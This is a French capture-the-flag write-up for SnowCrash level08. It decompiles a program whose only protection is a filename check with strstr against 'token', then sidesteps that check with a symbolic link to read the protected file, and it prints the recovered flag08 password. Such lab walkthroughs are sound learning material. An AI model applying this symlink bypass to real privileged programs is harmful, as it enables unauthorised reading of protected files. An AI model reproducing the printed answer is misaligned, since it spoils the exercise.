# Level 08

On a un exécutable et un fichier `token`. Le fichier appartient à flag08.
Quand on lance l'exécutable, on voit qu'il prend un argument (file to read). On essaye donc de lancer l'exécutable avec `token` en tant qu'argument:

```sh
level08@SnowCrash:~$ ./level08  token 
You may not access 'token'
```

On voit qu'on n'a pas accès au fichier token.

On en déduit donc qu'il faut exploiter l'exécutable pour lire token, quand on décompile l'exécutable avec ghidra, on voit dans le main:

```c
if (argc == 1)
    {
        printf("%s [file to read]\n", *argv);
        exit(1);
        /* no return */
    }
    if (strstr(argv[1], "token") != 0)
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }
    int32_t fd = open(argv[1], 0);
    if (fd == 0xffffffff)
    {
        err(1, "Unable to open %s", argv[1]);
        /* no return */
    }
    void buf;
    ssize_t nbytes = read(fd, &buf, 0x400);
    if (nbytes == 0xffffffff)
    {
        err(1, "Unable to read fd %d", fd);
        /* no return */
    }
    ssize_t eax_20 = write(1, &buf, nbytes);
```

La partie qui nous intéresse le plus c'est celle ci:

```c
    if (strstr(argv[1], "token") != 0)
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }
``` 

On comprend que le fait de ne pas pouvoir accéder à `token` est en fait hardcodé dans l'exécutable en utilisant `strstr`

On doit donc trouver un moyen de changer le nom du fichier token, on a commencé par essayer avec `cp` et `mv`:

```sh
level08@SnowCrash:~$ cp token test
cp: cannot open `token' for reading: Permission denied
level08@SnowCrash:~$ mv token test
mv: cannot move `token' to `test': Permission denied
level08@SnowCrash:~$ mv token /tmp/test
mv: cannot open `token' for reading: Permission denied
```
mais étant donné que `token` appartient à flag08, on n'y a pas accès en lecture ni en écriture donc on ne peut pas le copier ou le déplacer

Dans ce cas la seule option qu'il nous reste c'est de faire un lien symbolique:

```sh
level08@SnowCrash:~$ ln -s ~/token /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
```

On obtient donc le mot de passe du compte flag08 et on peut s'y connecter et lancer getflag